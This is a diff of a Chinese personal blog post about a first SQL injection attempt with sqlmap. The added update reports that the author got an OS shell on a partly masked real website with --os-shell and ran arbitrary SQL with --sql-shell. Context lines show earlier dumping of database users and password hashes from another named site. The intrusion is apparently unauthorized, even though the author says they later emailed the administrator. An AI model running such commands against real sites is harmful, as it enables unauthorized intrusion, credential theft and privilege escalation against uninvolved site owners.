@@ -90,7 +90,9 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/1202F11D4AB042FC93B1A97DF274AEAB?method=download&shareKey=7cefc8e1c753fc1d0282f4b31f66fb67">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/353080C1C8654A138F93185167BF7381?method=download&shareKey=5ed0fd27c99d9a77deca3257a1f34c59">
-<meta property="og:updated_time" content="2018-08-20T14:38:50.554Z">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/f6e9b590a7863281b20f22dcbe70ad84/xmlnote/08B716AB9B0649C6BFC8B9303950A93C/4361">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/f6e9b590a7863281b20f22dcbe70ad84/xmlnote/99609FEC62624D06ABD98E4CFF5582F8/4393">
+<meta property="og:updated_time" content="2018-08-23T14:39:50.945Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第一次SQL注入总结(使用sqlmap)">
 <meta name="twitter:description" content="前言&amp;#160; &amp;#160; &amp;#160;&amp;#160;一直有关注安全行业，因为热爱，虽没有投身于安全的工作中，但是也在一点一点的积累，可以说这个行业的门槛太高，要学习的东西太多，没有一套学习体系，也可以说这个行业的门槛太低，一大堆工具可以拿来用。诚以为进入这个行业，必不能心高气傲，一定要善于发现，乐于探索，忍受孤独。 &amp;#160; &amp;#160; &amp;#160;&amp;#160;漏洞只是开发人员留下的BU">
@@ -288,9 +290,9 @@
 			
               <span class="post-letters-count">
               &nbsp; | &nbsp;
-              <span>530 字</span>
+              <span>728 字</span>
               &nbsp; | &nbsp;
-              <span>2 min</span>
+              <span>3 min</span>
               </span>
             
           </span>
@@ -356,6 +358,11 @@
 <p>&#160; &#160; &#160;&#160;但是在这个注入点(‘and’1’=’1)利用不了,也许是我学艺不精，还不知道怎么利用(有看到这里的朋友可以留言指导一下)。</p>
 <h2 id="2018-08-20-20-21-54-更新"><a href="#2018-08-20-20-21-54-更新" class="headerlink" title="2018-08-20 20:21:54 更新"></a>2018-08-20 20:21:54 更新</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./sqlmap.py –u “https://www.anti-x.net/inject.asp?id=injecthere” –-users //列用户</span><br><span class="line">./sqlmap.py –u “https://www.anti-x.net/inject.asp?id=injecthere” –-passwords //获取密码hash</span><br></pre></td></tr></table></figure>
 <p>拿到mssql数据库用户与密码，但是数据库是hash加密的，还加了salt，还是不能破解密码。(三天了还是没有拿到shell,难受)</p>
+<h2 id="2018-08-23-20-10-50-更新"><a href="#2018-08-23-20-10-50-更新" class="headerlink" title="2018-08-23 20:10:50 更新"></a>2018-08-23 20:10:50 更新</h2><p>&#160; &#160; &#160;&#160;今天突然想起，这个注入点是在windows平台上发现的，当是明明有两个payload，怎么kali上面就只有一个了。<br>&#160; &#160; &#160;&#160;于是在windows使用下面这句sqlmap命令，竟然拿到了shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;www.*****.net.cn/About.aspx?code=0102&quot; --os-shell  //系统交互shell</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://note.youdao.com/yws/public/resource/f6e9b590a7863281b20f22dcbe70ad84/xmlnote/08B716AB9B0649C6BFC8B9303950A93C/4361" alt="image"></p>
+<p>&#160; &#160; &#160;&#160;还可以用下面这句指令获得执行指定sql命令的权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;www.*****.net.cn/About.aspx?code=0102&quot; --sql-shell  //执行指定sql命令</span><br></pre></td></tr></table></figure>
+<p>&#160; &#160; &#160;&#160;后面就可以尝试提权了，但是为了不被黑产利用这个漏洞，本人决定联系管理员修复，站长工具中找到了邮箱。<br><img src="https://note.youdao.com/yws/public/resource/f6e9b590a7863281b20f22dcbe70ad84/xmlnote/99609FEC62624D06ABD98E4CFF5582F8/4393" alt="image"><br>到些为止，之后得学习SQL Server数据库操作，还需要学习一下sqlmap源码。</p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a href="http://www.vuln.cn/1992" target="_blank" rel="noopener">博主–漏洞人生</a></p>
 <p>[2] <a href="https://www.2cto.com/database/201404/294363.html" target="_blank" rel="noopener">红黑联盟</a></p>
 
@@ -573,7 +580,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程"><span class="nav-number">2.</span> <span class="nav-text">过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018-08-20-20-21-54-更新"><span class="nav-number">3.</span> <span class="nav-text">2018-08-20 20:21:54 更新</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程"><span class="nav-number">2.</span> <span class="nav-text">过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018-08-20-20-21-54-更新"><span class="nav-number">3.</span> <span class="nav-text">2018-08-20 20:21:54 更新</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018-08-23-20-10-50-更新"><span class="nav-number">4.</span> <span class="nav-text">2018-08-23 20:10:50 更新</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
             
 
           </div>
